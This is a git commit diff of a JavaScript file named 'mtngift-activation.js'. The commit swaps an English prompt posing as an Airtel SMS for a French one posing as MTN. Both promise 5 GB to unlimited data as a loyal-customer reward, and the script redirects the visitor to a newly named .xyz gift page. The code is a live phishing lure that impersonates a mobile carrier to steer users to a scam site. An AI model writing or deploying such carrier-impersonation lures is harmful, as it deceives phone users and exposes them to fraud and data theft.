ebbb844150ce81b0ad132e052ee742cc07e233ab
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-05 20:59:34 -0700

    Update mtngift-activation.js

--- mtngift-activation.js
+++ mtngift-activation.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('Airtel SMS: Dear customer, kindly check if your Airtel sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press 1 to check now ','1');
+password=prompt('SMS MTN : Cher client, veuillez vérifier si votre carte SIM MTN est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
 if (password != '1') {
-location.href='https://2024-program.xyz/mofaya';
+location.href='https://todyforu.xyz/mtn-gift.html';
 }
